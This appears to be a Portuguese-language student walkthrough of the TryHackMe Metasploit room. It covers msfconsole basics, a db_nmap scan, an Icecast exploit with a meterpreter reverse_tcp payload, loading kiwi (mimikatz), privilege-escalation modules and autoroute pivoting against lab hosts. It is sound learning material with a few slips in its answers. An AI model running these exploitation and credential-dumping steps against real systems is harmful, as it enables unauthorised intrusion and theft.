Para entender melhor a sala Eternal Blue e outras salas que podem utilizar esta ferramenta, iniciei a sala metasploit room.

Metasploit é um framework de penetração de uma ferramenta utilizada por muitos engenheiros de segurança. 

Vamos começar com o passo a passo para entender o funcionamento do metasploit. Primeiramente, inicializei o banco de dados utilizando o comando:

```
msfdb init
```

Antes de começar o metasploit, eu posso ver algumas das opções avançadas que posso acionar para iniciar o console. Posso checar essas opções utilizando o comando:

```
msfconsole -h
```

## Initializing...

A primeira pergunta é para identificar qual seria a opção que adicionada ao comando msfconsole iria entrar no metasploit sem imprimir o banner. Usando o comando de ajuda da ferramenta, encontrei a seguinte informação:

```
-q, --quiet                      Do not print the banner on startup
```

Agora que o banco de dados foi inicializado, eu iniciei o programa com o comando:

```
msfconsole
```

Após iniciar a ferramenta, verifiquei o status do banco utilizando:

```
db_status
```

O que me retornou:

```
[*] Connected to msf. Connection type: postgresql.
```

## Rock 'em to the Core \[Commands\]

Dentro da máquina, eu comecei a explorar os comandos do metasploit usando o comando:

```
help or ?
```

Depois disso eu comecei a analisar a lista em busca de um dos principais comandos para busca e achei o seguinte:

```
search
```

Em seguida, procurei pelo comando que seleciona isto como o módulo ativo e achei:

```
use
```

Mas se por acaso eu queira ver alguma informação sobre um módulo especifico ou apenas o acionado, eu posso usar o seguinte comando:

```
info
```

O metasploit rem uma função similar ao netcat onde eu posso realizar conexões rápidas com um host simplesmente para verificar que podemos "conversar" com ele. O comando é:

```
connect
```

Agora estavam me perguntando qual seria o comando que eu utilizo para mudar o valor de uma variável. O comando que escolhi foi:

```
set
```

A ferramenta metasploit usa variáveis globais, que podem ser muito úteis quando o foco é em uma "single box". O comando para alterar o valor das variáveis globais é:

```
setg
```

Agora o desafio me pede para que eu procure um comando responsável por demonstrar o valor que uma variável contém. O comando que foi apresentado é:

```
get
```

Para modificar o valor da variável para Null / No value:

```
unset
```

A próxima pergunta era redirecionada ao salvamento de informações geradas, pois é uma das coisas mais essênciais na área de segurança. Ele pergunta qual seria o comando utilizado para salvar a saída em um arquivo para consultas futuras. O seguinte comando foi encontrado:

```
spool
```

Muitas vezes é bom ter os valores setados para que seja mais fácil, ao iniciar o Metasploit. O comando utilizado para armazenar as configurações em um arquivo de configurações é (lembrando que isso salvará em um arquivo as configurações e pode ser desfeito simplesmente removendo o arquivo):

```
save
```

## Modules for Every Occasion!

Metasploit consiste de 6 *core modules* que fazem parte do conjunto de ferramentas que eu utilizo. A imagem abaixo demonstra a arquitetura do framework, mas não contém o módulo **Post**

![[Pasted image 20220209165057.png]]

O mais comum dentre os módulos que vamos utilizar conforme o diagrama, é o **Exploit**.

O módulo que contém vários *bits* de shellcode que nós mandamos para ser executado seguindo o exploitation é o **Payload**

O módulo que é mais utilizado para escaneamento e verificação para ver se as máquinas são **exploitable** é o **Auxiliary**

Uma das atividades mais comuns de se fazer depois de uma exploitation é looting e pivoting. O módulo que providência essa capacidade é **Post**.

Comumente utilizado para obfuscação de payload, que pode modificar a aparência do nosso exploit para que evite detecção de assinatura é o módulo **Encoder**

O módulo que é utilizado com buffer de overflow e ROP attacks é o **NOP**

Nem todos os módulos são carregados por padrão, por isso, para carregar um módulo, eu utilizo o comando:

```
load
```

## Move that shell!

Metasploit consegue rodar o nmap ou impostar seus scans para serem utiliados. Utilizei o seguinte comando para testar isso:

```
db_nmap -sV 10.10.151.247
```

E o seguinte resultado foi visto:

```
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-10 13:56 -03
[*] Nmap: Nmap scan report for 10.10.151.247
[*] Nmap: Host is up (0.24s latency).
[*] Nmap: Not shown: 988 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open  http               Icecast streaming media server
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 410.32 seconds
```

depois disso, eu analisei quais eram os hosts e os dados que tinham sido coletados para o banco de dados.

```
hosts
```

```
Hosts
=====

address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------  ---------  -----  -------  ----  --------
10.10.151.247             Unknown                    device
```

```
Hosts
=====

address        mac  name     os_name    os_flavor  os_sp  purpose  info  comments
-------        ---  ----     -------    ---------  -----  -------  ----  --------
10.10.74.229        DARK-PC  Windows 7             SP1    client
10.10.151.247                Unknown                      device
10.10.217.179                Unknown                      device
```

Observar os serviços do banco de dados

```
services
```

```
Services
========

host           port   proto  name               state  info
----           ----   -----  ----               -----  ----
10.10.151.247  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.151.247  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.151.247  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.151.247  3389   tcp    ssl/ms-wbt-server  open
10.10.151.247  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.151.247  8000   tcp    http               open   Icecast streaming media server
10.10.151.247  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.151.247  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.151.247  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.151.247  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.151.247  49159  tcp    msrpc              open   Microsoft Windows RPC
10.10.151.247  49160  tcp    msrpc              open   Microsoft Windows RPC
```

Depois, eu tentei o comando:

```
vulns
```

Esse comando não mostrará muito no momento, porém é apenas para que eu perceba que o Metasploit vai procurar por vulnerabilidades já conhecidas.

```
Vulnerabilities
===============

Timestamp              Host          Name                      References
---------              ----          ----                      ----------
2022-02-10 21:10:28 U  10.10.74.229  Icecast Header Overwrite  CVE-2004-1561,OSVDB-10406,BID
TC                                                             -11271,URL-http://archives.ne
                                                               ohapsis.com/archives/bugtraq/
                                                               2004-09/0366.html
```


Agora que escaneamos o sistema da nossa vitima, vamos tentar conectar com um payload do metasploit. Primeiro, precisamos procurar pelo payload do alvo. Podemos simplesmente escrever `use` junto com uma string que será o exploit alvo. Por exemplo, eu digitei:

```
use icecast
```

e me apareceu as seguintes informações:

```
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
```

Mesmo esse comando sendo muito útil, ainda não é o exploit que eu desejo. Por isso, vou procurar utilizando o comando:

```
search multi/handler
```

```
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
```

então, eu rodei o comando:

```
use NUMBER_NEXT_TO  exploit/multi/handler
```

NUMBER_NEXT_TO é o número que está a esquerda na coluna "#"

Agora vamos setar o payload usando o comando:

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

Depois o comando:

```
set LHOST YOUR_IP_ON_TRYHACKME
```

usei

```
ip addr
```

para pegar o ip da máquina e depois:

```
use icecast
```

Depois disso, eu rodei o comando:

```
set RHOSTS 10.10.151.247
```

Após setar todas as variáveis, rodei o comando

```
exploit
or
run -j
```

```
[*] Started reverse TCP handler on 192.168.15.70:4444 
[*] Exploit completed, but no session was created.
```

Conferi usando:

```
jobs
```

After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`

## We're in, now what?

Após seguir os passos, eu usei o comando

```
ps
```

para listar os processos.

```
Process List
============

 PID   PPID  Name            Arch  Session  User          Path
 ---   ----  ----            ----  -------  ----          ----
 0     0     [System Proces
             s]
 4     0     System
 352   692   sppsvc.exe
 416   4     smss.exe
 544   536   csrss.exe
 560   692   TrustedInstall
             er.exe
 588   692   svchost.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 816   692   svchost.exe
 884   692   svchost.exe
 932   692   svchost.exe
 1000  692   svchost.exe
 1016  692   svchost.exe
 1056  692   svchost.exe
 1108  1548  Icecast2.exe    x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Wi
                                                          n32\Icecast2.exe
 1136  692   svchost.exe
 1288  692   spoolsv.exe
 1336  692   svchost.exe
 1404  692   taskhost.exe    x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1516  1016  dwm.exe         x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1548  1500  explorer.exe    x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1648  692   amazon-ssm-age
             nt.exe
 1740  692   LiteAgent.exe
 1776  692   svchost.exe
 2012  692   Ec2Config.exe
 2256  816   WmiPrvSE.exe
 2508  692   SearchIndexer.
             exe
 2580  2992  mscorsvw.exe
 2668  816   rundll32.exe    x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
 2708  2668  dinotify.exe    x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
 2992  692   mscorsvw.exe
 3052  692   vds.exe
```

Depois disso, eu tentei me mover para o processo spool. Tentei utilizar o comando:

```
migrate -N spoolsv.exe 
```

Mas não funcionou, pois não tenho privilégios o suficiente

```
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 1108 to 1288...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
```

Depois disso, eu tentei elevar meus privilégios. Usei um comando para encontrar mais informações sobre o usuário do processo que estou. O comando era

```
getuid
```

Outro comando que eu utilizo para pegar informações do sistemas é:

```
sysinfo
```

Depois disso, eu busquei um comando para carregar mimikatz (a nova versão, no caso). O comando é, segundo este [site](https://subscription.packtpub.com/book/networking-and-servers/9781788623179/5/ch05lvl1sec79/using-mimikatz):

```
load kiwi
```

Agora tentei ir em frente e elevar o privilégio do meu usuário. O comando que usei foi:

```
getprivs
```

Comando que utilizo para transferir arquivos para minha vítima:

```
upload
```

Comando para o caso de eu querer rodar um módulo metasploit:

```
run
```

O comando utilizado para descobrir as informações da rede e interfaces na nossa vítima:

```
ipconfig
```

Rodei o comando 

```
run post/windows/gather/checkvm
```

Isso vai determinar se estou em uma VM.

```
meterpreter > run post/windows/gather/checkvm

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[*] Checking if the target is a Virtual Machine ...
[-] Post interrupted by the console user
```

Irei rodar um comando para checar vários exploits para que possamos usar isso para elevar nossos privilégios.

```
run post/multi/recon/local_exploit_suggester
```

```
[*] 10.10.217.179 - Collecting local exploits for x86/windows...
[*] 10.10.217.179 - 4 exploit checks are being tried...
[-] 10.10.217.179 - Post interrupted by the console user
```

Depois, eu tentei forçar o RDP a ficar disponível, mas provavelmente não funcionou pois não sou administrador:

```
run post/windows/manage/enable_rdp
```

## Makin' Cisco Proud

As perguntas estão abaixo:

Last but certainly not least, let's take a look at the autorouting options available to us in Metasploit. While our victim machine may not have multiple network interfaces (NICs), we'll walk through the motions of pivoting through our victim as if it did have access to extra networks.

### Questions

Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the `-n` flag in your answer.

```
run autoroute -s 172.18.1.0 -n 255.255.255.0
```

Additionally, we can start a socks5 proxy server out of this session. Background our current meterpreter session and run the command `search server/socks5`. What is the full path to the socks5 auxiliary module?

```
auxiliary/server//socks5
```

Once we've started a socks server we can modify our _/etc/proxychains.conf_ file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks5 server with proxychains?

Para me ajudar, busquei por um artigo sobre socks5 e como usar. Acabei achando [este](https://www.firewall.cx/vpn/vpn-guides-articles/1191-best-socks5-proxy-guide-torrenting-free-proxy-list.html)



